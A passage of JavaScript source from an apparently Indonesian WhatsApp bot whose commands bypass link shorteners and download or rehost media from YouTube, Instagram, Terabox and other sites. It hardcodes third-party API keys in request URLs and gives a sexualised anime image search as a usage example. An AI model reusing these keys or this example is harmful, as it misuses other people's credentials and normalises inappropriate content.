        console.error(error);
        replyerror('Yah Error');
    }
              }
              break
//=============================================================//
case 'bypassouo': {
if (!args[0]) return paycall( `Example : ${prefix + command} link`)
let error16;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
  let res = await fetch(`https://api.lolhuman.xyz/api/ouo?apikey=GataDios&url=${args[0]}`)
  let data = await res.json()
  let bypassnya = data.result
 await conn.sendMessage(m.chat, { text: bypassnya }, {quoted: blue})
 } catch (er) {
					error16 = true;
				} finally {
					if (error16) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'bypassmirror': {
if (!args[0]) return paycall( `Example : ${prefix + command} link`)
let error17;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
  let res = await fetch(`https://api.lolhuman.xyz/api/mirrorcreator?apikey=GataDios&url=${args[0]}`)
  let pemanggil = await res.json()
  let anuan = pemanggil.result
 await conn.sendMessage(m.chat, { text: anuan.dropapk }, {quoted: blue})
 } catch (er) {
					error17 = true;
				} finally {
					if (error17) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
//========================DOWNLOAD YOUTUBE=========================//
case 'yts': case 'ytsearch': {
if (!text) return paycall(`Example : ${prefix + command} Dj malam pagi`)
try {
let search = await yts(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
ytreply(teks)
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'play':  case 'song': {
if (!text) return paycall(`Example : ${prefix + command} DJ MALAM PAGI`)
const shinchanplaymp3 = require('./lib/ytdl2')
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await shinchanplaymp3.mp3(anup3k.url)
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            showAdAttribution: true,
            containsAutoReply: true,
            title:anup3k.title,
            body: ownername,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted: fkontak})
await fs.unlinkSync(pl.path)
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case "ytmp3": case "ytaudio": {
const shinchanmp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !shinchanmp3.isYTUrl(text)) return paycall(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const audio=await shinchanmp3.mp3(text)
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            showAdAttribution: true,
            containsAutoReply: true,
            title:audio.meta.title,
            body: ownername,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted: m})
await fs.unlinkSync(audio.path)
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'ytmp4': case 'ytvideo': {
const shinchanmp4 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !shinchanmp4.isYTUrl(text)) paycall(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const vid=await shinchanmp4.mp4(text)
const ytc=`
*🐼Tittle:* ${vid.title}
*🐼Date:* ${vid.date}
*🐼Duration:* ${vid.duration}
*🐼Quality:* ${vid.quality}`
await conn.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted: m})
} catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
/*case 'play': {
if (!text) return paycall(`Example : ${prefix + command} DJ MALAM PAGI`)
m.reply(global.wait)
query = args.join(" ")
let datplay = await fetchJson(`https://api.lolhuman.xyz/api/ytplay?apikey=haikalgans&query=${query}`)
let dathasil = await datplay.result
let downloadnya = dathasil.audio
conn.sendMessage(m.chat, { audio: { url: downloadnya.link }, mimetype: 'audio/mp4',
contextInfo: {
                     externalAdReply:{
            showAdAttribution: true,
            containsAutoReply: true,
            title: dathasil.title,
            body: dathasil.uploader,
            thumbnail: await fetchBuffer(dathasil.thumbnail),
            mediaType:2,
            mediaUrl: dathasil.channel,
                    }}}, { quoted: m})}
        break
case 'ytmp3': case 'youtubemp3': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=r3whEJ2KjeQ`)
m.reply(global.wait)
let error35;
try {
let sizenyahe = '128k'
let dataytnya = await fetchJson(`https://skizo.tech/api/yt1s?url=${args[0]}&apikey=nerobot`)
let ytnya = dataytnya.audio
conn.sendMessage(m.chat, { audio: { url: ytnya[sizenyahe].url }, mimetype: 'audio/mp4' }, { quoted: m })
} catch (er) {
error35 = true;
} finally {
if (error35) {
replyerror("Yah Error:(.");
}
}
}
break
case 'ytmp4': case 'youtubemp4': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=r3whEJ2KjeQ`)
m.reply(global.wait)
let error36;
try {
let dataytnya2 = await fetchJson(`https://vihangayt.me/download/ytmp4?url=${args[0]}`)
let ytnya2 = dataytnya2.data
let judulytnya = `${done}\n📝Judul: ${ytnya2.title}\n⏳Durasi: ${ytnya2.duration}`
let hasilyt = ytnya2.vid_360p
//conn.sendMessage(from, { video: { url: hasilyt }, mimetype: 'video/mp4', caption : judulytnya, quoted: m})
conn.sendFile2(from, hasilyt, `video.mp4`, judulytnya, m)
} catch (er) {
error36 = true;
} finally {
if (error36) {
replyerror("Yah Error:(.");
}
}
}
break*/
//========================INSTAGRAM DL============================//
/*case 'igvid': case 'igvideo': case 'igreels': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
			let error20;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        let res = await fetchJson(`https://vihangayt.me/download/instagram2?url=${args[0]}`)
   //     let igfonya = res.data
            for (let igvid of res.data) {
             //  await conn.sendImage(m.chat, igimg.url, done, m)
           //  await conn.sendFile2(m.chat, igimg.download_link, '', done, m);
           await conn.sendMessage(from, { video: { url: igvid.download_link }, caption: `${done}` }, { quoted: m })
            }
             } catch (er) {
					error20 = true;
				} finally {
					if (error20) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
case 'igimg': case 'igfoto': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
			let error39;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        let res = await fetchJson(`https://vihangayt.me/download/instagram2?url=${args[0]}`)
   //     let igfonya = res.data
            for (let igimg of res.data) {
             //  await conn.sendImage(m.chat, igimg.url, done, m)
           //  await conn.sendFile2(m.chat, igimg.download_link, '', done, m);
           await conn.sendMessage(from, { image: { url: igimg.download_link }, caption: `${done}` }, { quoted: m })
            }
             } catch (er) {
					error39 = true;
				} finally {
					if (error39) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
case 'igdl': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
			let error40;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        let res = await fetchJson(`https://vihangayt.me/download/instagram2?url=${args[0]}`)
   //     let igfonya = res.data
            for (let igdouble of res.data) {
             //  await conn.sendImage(m.chat, igimg.url, done, m)
            await conn.sendFile2(m.chat, igdouble.download_link, '', done, m);
          // await conn.sendMessage(from, { image: { url: igimg.download_link }, caption: `${done}` }, { quoted: m })
            }
             } catch (er) {
					error40 = true;
				} finally {
					if (error40) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break*/
case 'igvid': case 'igvideo': case 'igreels': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
if (!text.includes('instagram.com')) return paytod(`Kirim Link Instagram nya bodoh`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    if (!isCreator) {
await m.reply(`Hai @${m.sender.split('@')[0]} Video akan Dikirim dalam obrolan pribadi.`)
}
        let res = await fetchJson(`https://aemt.me/download/igdl?url=${args[0]}`)
            for (let igvid of res.result) {
           await conn.sendMessage(m.sender, { video: { url: igvid.url }, caption: `${done}` }, { quoted: m })
            }
} catch (error) {
    console.error(error);
    replyerror(`Error Bang`);
  }
            }
break
case 'igimg': case 'igfoto': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
if (!text.includes('instagram.com')) return paytod(`Kirim Link Instagram nya bodoh`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    if (!isCreator) {
await m.reply(`Hai @${m.sender.split('@')[0]} Foto akan Dikirim dalam obrolan pribadi.`)
}
        let res = await fetchJson(`https://aemt.me/download/igdl?url=${args[0]}`)
             for (let igimg of res.result) {
           await conn.sendMessage(m.sender, { image: { url: igimg.url }, caption: `${done}` }, { quoted: m })
            }
} catch (error) {
    console.error(error);
    replyerror(`Error Bang`);
  }
            }
break
case 'ig': case 'igdl': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
if (!text.includes('instagram.com')) return paytod(`Kirim Link Instagram nya bodoh`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    if (!isCreator) {
await m.reply(`Hai @${m.sender.split('@')[0]} Foto/Video akan Dikirim dalam obrolan pribadi.`)
}
        let res = await fetchJson(`https://aemt.me/download/igdl?url=${args[0]}`)
             for (let igdouble of res.result) {
           await conn.sendFile2(m.sender, igdouble.url, '', done, m);
            }
} catch (error) {
    console.error(error);
    replyerror(`Error Bang`);
  }
            }
break
//========================TERABOX DOWNLOAD============================//
case 'tera':
case 'terabox': {
  if (args.length === 0) return reply(`Example: ${prefix + command} https://terabox.com/s/1ah0l69Zs2pLPH3euBduCig`);
  
  try {
    await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let res = await fetchJson(`https://rest-api.akuari.my.id/downloader/teraboxdl?link=${args[0]}`);
    
    for (let x of res.linkdl) {
      let isVideo = x.includes('.mp4');
      
      try {
        let response = await fetch(x);
        let buffer = await response.buffer();

      if (isVideo) {
          await conn.sendMessage(from, { video: buffer, mimetype: 'video/mp4', caption: done }, { quoted: m });
        } else {
          await conn.sendMessage(from, { image: buffer, caption: done }, { quoted: m });
        }
      } catch (error) {
        console.error('Error fetching buffer:', error);
        replyerror(`Error fetching buffer`);
      }
    }
  } catch (error) {
    console.error(error);
    replyerror(`Error Bang`);
  }
}
break;
//========================END============================//
/*case 'anime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                            let error22;
try {
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=haikalgans&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await conn.sendImage(m.chat, thumbnail, ini_txt, blue)
                                                  } catch (er) {
					error22 = true;
				} finally {
					if (error22) {
						replyerror("Yah Proses Gagal :(");
					}
					}
                    break*/
case 'anime': {
if (!text) return paycall(`Anime apa yang sedang kamu cari?`)
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
animetxt = `🎀 *Judul: ${anime.title}*\n`
animetxt += `🎋 *Type: ${anime.type}*\n`
animetxt += `🎐 *Tayang perdana: ${anime.premiered}*\n`
animetxt += `💠 *Total Episode: ${anime.episodes}*\n`
animetxt += `📈 *Status: ${anime.status}*\n`
animetxt += `💮 *Genres: ${anime.genres}*\n`
animetxt += `📍 *Studio: ${anime.studios}*\n`
animetxt += `🌟 *Score: ${anime.score}*\n`
animetxt += `💎 *Rating: ${anime.rating}*\n`
animetxt += `🏅 *Rank: ${anime.ranked}*\n`
animetxt += `💫 *Popularity: ${anime.popularity}*\n`
animetxt += `♦️ *Trailer: ${anime.trailer}*\n`
animetxt += `🌐 *URL: ${anime.url}*\n`
animetxt += `❄ *Deskripsi:* ${anime.synopsis}*`
conn.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
                
case 'animeid': {
if (!text) return paytod(`Example: ${prefix + command} solo leveling`);  
  try {
    await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let res = await fetchJson(`https://rest-api.akuari.my.id/anime/search?query=${text}`);
    if (res.respon) {
    for (let x of res.respon) {
    let capid = `📝Judul: ${x.title}\n🔗Link: ${x.link}\n📌Id: ${x.id}\n📆${x.releaseDate}`
    conn.sendMessage(m.chat,{image:{url: x.img}, caption: capid},{quoted:m})
    }
    } else {
    m.reply('Anime not found!')
    }
    } catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
case 'animedl':{
if (!text) return paytod(`Masukan id nya, dapatin id anime nya ketik animeid: (judul anime)\nExample: ${prefix + command} solo leveling(id anime)|1(Episode anime nya)`);
let judul = text.split('|')[0] ? text.split('|')[0] : '-'
let episode = text.split('|')[1] ? text.split('|')[1] : '-'
if (!episode) return paytod(`Example: ${prefix + command} solo leveling|1`);
let resolusi = `854x480`
  try {
    await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let res = await fetchJson(`https://rest-api.akuari.my.id/anime/download?id=${judul}&episode=${episode}`);
    if (res.respon) {
    let hasildl = res.respon
await conn.sendMessage(m.chat, { video : { url : hasildl[resolusi] }, mimetype: 'video/mp4', caption : done }, { quoted : m })
} else {
m.reply('Id Salah / Anime / episode not found!')
}
        } catch (error) {
        console.error(error);
        replyerror('Yah Error');
    }
}
break
//========================BRAINLY SCRAPE============================//
case 'brainly2':
if (!text) return reply(`Example: ${prefix + command} siapakah sukarno`)
Brainly.initialize();
var brainly = new Brainly('id');
let restod = await brainly.search(text, 'id')
	//console.log(restod)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
	if (restod) {
		var answer = restod.map(({ question, answers }, i) => `
*Pertanyaan*${question.grade ? ` (${question.grade})` : ''}\n${question.content}${answers.map((v, i) => `\n
*Jawaban Ke ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Best)' : ''}
${v.content}${v.attachments.length > 0 ? `\n*Media Url*: ${v.attachments.join(', ')}` : ''}`).join``}`).join('\n\n' + '-'.repeat(45))
		replybrainly(answer.trim())
		}
		break		
case 'brainly':
                    if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
                    query = args.join(" ")
                    let error24;
try {
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=GataDios&query=${query}`)
                    lala = get_result.result
                    ini_txt = "Beberapa Pembahasan Dari Brainly :\n\n"
                    for (var x of lala) {
                        ini_txt += `==============================\n`
                        ini_txt += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
                        ini_txt += `\`\`\`Jawaban :\`\`\`\n${x.answer.content}\n`
                        ini_txt += `==============================\n\n`
                    }
                    replybrainly(ini_txt)
                    } catch (er) {
					error24 = true;
				} finally {
					if (error24) {
						replyerror("Yah Proses Gagal :(");
					}
					}
                    break
case 'ruangguru': case 'roboguru': {
			if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
			query = args.join(" ")
			let error31;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
			let { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=GataDios&query=${query}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
			var robgur = 'Beberapa Pembahasan Dari Roboguru :\n\n'
			for (var x of data.result) {
				robgur += `==============================\n`
				robgur += `\`\`\`Pertanyaan :\`\`\`\n${x.question}\n\n`
				robgur += `\`\`\`Jawaban :\`\`\`\n${x.answer}\n`
				robgur += `==============================\n\n`
			}
			replyguru(robgur)
			            } catch (er) {
error31 = true;
} finally {
if (error31) {
replyerror("ERROR");
}
}
			}
			break
//========================LIRIK LAGU============================//
case 'lirik': {
  if (!text) return m.reply('Cari lagu apa?')
  query = args.join(" ")
  let error25;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let res = await fetch(`https://api.akuari.my.id/search/lirik?query=${query}`)
    let data = await res.json()
    let uhuy = data.result
    let mes = `${uhuy[0].lirik}`;
conn.sendText(from, mes, m)
} catch (er) {
error25 = true;
} finally {
if (error25) {
replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
}
}
}
break
case 'lirik2': {
if (!text) return paycall(`mau nyari lirik apa?`)
let error26;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const fg = require('api-dylux')
let res = await fg.lyrics(text);
 let mes = `▢ *${res.title}*
▢ *${res.artist}*

▢ ${res.lyrics}`;
conn.sendFile2(m.chat, res.thumb, 'img.png', mes, m)
} catch (er) {
error26 = true;
} finally {
if (error26) {
replyerror("Maaf lirik tersebut tidak muncul di database\nHarus lagu luar negri gak bisa lagu indo😁");
}
}
}
break
case 'lirik3': {
const { lyrics, lyricsv2 } = require('@bochilteam/scraper');
    let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : ''
    if (!teks) throw `Use example ${usedPrefix}${command} hallo`
    const result = await lyricsv2(teks).catch(async _ => await lyrics(teks))
    m.reply(`
Lyrics *${result.title}*
Author ${result.author}


${result.lyrics}


Url ${result.link}
`.trim())
}
break
//========================SIMI============================//
case 'simi': {
if (!text) return paycall(`Chat bebas bersama simi🐣`)
let error27;
try {
let res = await fetch(`https://api.akuari.my.id/simi/simi2?query=${encodeURIComponent(text)}`)
  let data = await res.json()
  replysimi(data.respon)
  } catch (er) {
error27 = true;
} finally {
if (error27) {
replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
}
}
}
break
case 'wallpaper': {
if (!text) return m.reply(`Mau Nyari Foto Apa?`)
let gis = require('g-i-s')
gis(text, async (error, result) => {
let error30;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
n = result
images = n[Math.floor(Math.random() * n.length)].url
await conn.sendImage(m.chat, images, done, m)
} catch (er) {
error30 = true;
} finally {
if (error30) {
replyerror("Error");
}
}
})
}
break
case 'img': case 'gimage': {
if (!text) return m.reply(`${command} Nezuko Nude|5`)
if (args.length >= 10) return m.reply('Kebanyakan!')
var teksnyauy = text.split("|")[0]
var jumlah = text.split("|")[1]
if (!jumlah) return m.reply(`${command} Nezuko Nude|5`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const { googleImage } = require('@bochilteam/scraper');
for (let i = 0; i < jumlah ; i++){
const res = await googleImage(teksnyauy);
let image = res[Math.floor(Math.random() * res.length)]
let bufferimg = await fetchBuffer(image)
await conn.sendImage(m.chat, bufferimg, done, m)
//await conn.sendMessage(from, { image: { url: image }, caption: `${global.done}` }, { quoted: m })
//await conn.sendFile2(m.chat, bufferimg, 'jpeg', done, m)
}
} catch (error) {
        console.error(error);
        replyerror('DATA TIDAK DITEMUKAN');
    }
}
break
case 'mediafire': {
if (!args[0]) throw `Use example ${prefix} ${command} https://www.mediafire.com/file/941xczxhn27qbby/GBWA_V12.25FF-By.SamMods-.apk/file`
const { mediafiredl } = require('@bochilteam/scraper');
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let resnyacyy = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = resnyacyy
    let caption = `
*💌 Name:* ${filename}
*📊 Size:* ${filesizeH}
*🗂️ Extension:* ${ext}
*📨 Uploaded:* ${aploud}
`.trim()
    m.reply(`Sedang Mengunduh File:\n${caption}`)
await conn.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
  }
break
case 'gdrive': {
		if (!args[0]) return paytod(`Enter the Google Drive link`)
	const fg = require('api-dylux')
	try {
	await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
	let res = await fg.GDriveDl(args[0])
	 await m.reply(`≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	conn.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replyerror('Error: Check link or try another link') 
  }
}
break
case 'google': {
if (!q) return m.reply(`Mau Nyari Informasi Apa?`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'tr': case 'translate': {
	let lang
	if (args.length >= 2) {
		lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
	} else if (m.quoted && m.quoted.text) {
		lang = args[0] ? args[0] : 'id', text = m.quoted.text
	} else throw `Ex: ${prefix + command} id hello i am robot`
	let translate = require("@vitalets/google-translate-api")
	let transtod = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
	if (!transtod) throw `Error : Bahasa"${lang}" Tidak Support`
	m.reply(`*Terdeteksi Bahasa:* ${transtod.from.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${transtod.text}`.trim())
	}
break
/*case 'search': {
  if (!/image/.test(mime)) {
    throw `*Send/Reply the Image With Caption* ${prefix + command}`;
  }
  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }  
  reply(`Sedang Mencari Sumber...`)
  let media = await conn.downloadAndSaveMediaMessage(quoted);
  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
try {
    let datanya = await fetchJson(`https://api.zahwazein.xyz/animeweb/sauce?url=${anu}&apikey=zenzkey_133c4d90d6`)
    let hasil = await datanya.result[0]
   let { anidb_aid, source, year, est_time, part } = hasil.raw.data
    let capnya = `-------「 𝗦𝗢𝗨𝗥𝗖𝗘 𝗗𝗜𝗧𝗘𝗠𝗨𝗞𝗔𝗡 」-------\n🔖Anilist id : ${anidb_aid}\n📝Judul : ${source}\n📆Tanggal Rilis : ${year}\n⏳Menit : ${est_time}\n📊Episode : ${part}\n📈Similarity : ${datanya.result[0].similarity}%\n🔗Url : ${datanya.result[0].url}`
  await conn.sendImage(m.chat, datanya.result[0].thumbnail, capnya, m)
} catch (error) {
console.error(error);
replyerror(`Yah Proses Gagal:(`);
}
    }
    }
    break*/
  case 'search': {
  if (!/image/.test(mime)) {
    throw `*Send/Reply the Image With Caption* ${prefix + command}`;
  }
  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }  
  reply(`Sedang Mencari Sumber...`)
  let media = await conn.downloadAndSaveMediaMessage(quoted);
  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
try {
    let fetch = await fetchJson(`https://api.ouzen.xyz/animeweb/sauce?url=${anu}&apikey=zenzkey_133c4d90d6`);
    if (fetch.result) {
    let ini_result = await fetch.result
let caption = `Anime Source :\n\n`
for (let i of ini_result) {
caption += `🔖Anilist id: ${i.raw.data.anidb_aid}\n`
caption += `📝Judul: ${i.raw.data.source}\n`
caption += `📆Tanggal Rilis: ${i.raw.data.year}\n`
caption += `⏳Menit: ${i.raw.data.est_time}\n`
caption += `📊Episode: ${i.raw.data.part}\n`
caption += `📈Similarity: ${i.similarity}\n`
caption += `🔗Url: ${i.url}\n`
caption += `🔧Site: ${i.site}\n`
caption += `👤Author Name: ${i.authorName}\n`
caption += `⚙️Author Url: ${i.authorUrl}\n`
caption += `✏️Title: ${i.raw.data.title}\n`
caption += `👩‍💻Creator: ${i.raw.data.creator}\n`
caption += `🛠️Material: ${i.raw.data.material}\n`
caption += `👥Characters: ${i.raw.data.characters}\n\n`
}
await conn.sendImage(m.chat, fetch.result[0].thumbnail, caption, m)
} else {
m.reply('Not Found!')
}
} catch (error) {
console.error(error);
replyerror(`Yah Proses Gagal:(`);
}
    }
    }
    break
case 'dlcapcut': {
      if (!args[0]) throw `🚩 *Example:* ${command} https://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`;
      if (!text.includes('www.capcut.net')) return paytod(`Ini Bukan Link Capcut goblok😏`)
      let error32;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
  let cangcut = await fetchJson(`https://aemt.me/download/capcut?url=${args[0]}`)
  let capcutuwu = `${done}\n📝Tittle : ${cangcut.result.title}\n📄Deskripsi : ${cangcut.result.description}\n👀View : ${cangcut.result.digunakan}`
conn.sendMessage(m.chat, { video: { url: cangcut.result.video_ori }, caption: capcutuwu }, { quoted: m})
} catch (er) {
error32 = true;
} finally {
if (error32) {
replyerror("Yah Error:(.");
}
}
}
break
case 'imdb': {
  if (!text) throw 'Please provide a movie title';

  try {
    let resimdb = await fetch(`https://api.popcat.xyz/imdb?q=${encodeURIComponent(text)}`);

    if (!resimdb.ok) {
      throw new Error(`API request failed with status ${resimdb.status}`);
    }

    let json = await resimdb.json();

   // console.log('JSON response:', json);

    let ratings = json.ratings.map(rating => `• *${rating.source}:* ${rating.value}`).join('\n');

    let movieInfo = 
    `*Movie Information:*\n
     • *Title:* ${json.title}\n
     • *Year:* ${json.year}\n
     • *Rated:* ${json.rated}\n
     • *Released:* ${json.released}\n
     • *Runtime:* ${json.runtime}\n
     • *Genres:* ${json.genres}\n
     • *Director:* ${json.director}\n
     • *Writer:* ${json.writer}\n
     • *Actors:* ${json.actors}\n
     • *Plot:* ${json.plot}\n
     • *Languages:* ${json.languages}\n
     • *Country:* ${json.country}\n
     • *Awards:* ${json.awards}\n
     • *Metascore:* ${json.metascore}\n
     • *Rating:* ${json.rating}\n
     • *Votes:* ${json.votes}\n
     • *IMDB ID:* ${json.imdbid}\n
     • *Type:* ${json.type}\n
     • *DVD:* ${json.dvd}\n
     • *Box Office:* ${json.boxoffice}\n
     • *Production:* ${json.production}\n
     • *Website:* ${json.website}\n\n
     *Ratings:*\n${ratings}`;

    // send the movie poster along with the movie information as caption
    await conn.sendFile2(m.chat, json.poster, 'poster.jpg', movieInfo, m);
  } catch (error) {
    console.error(error);
    // Handle the error appropriately
  }
  };
  break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return paycall('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `🐼 *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
case 'ringtone': {
		if (!text) return paycall(`Example : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		conn.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
//========================BUAT EMAIL============================//

case 'tempmail': case 'createmail': {
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let data = await fetchJson(`https://dropmail.me/api/graphql/web-test-wgq6m5i?query=mutation%20%7BintroduceSession%20%7Bid%2C%20expiresAt%2C%20addresses%20%7Baddress%7D%7D%7D`)
let email = data["data"]["introduceSession"]["addresses"][0]["address"];
let id_ = data["data"]["introduceSession"]["id"];
let time = data["data"]["introduceSession"]["expiresAt"];
//await m.reply(`*EMAIL*: ${email}\n*ID:* ${id_}\n*Tanggal:* ${time}`)
await conn.sendMessage(m.chat, {text: `${email}`}, {quoted: m})
await conn.sendMessage(m.chat, {text: `${id_}`}, {quoted: m})
} catch (er) {
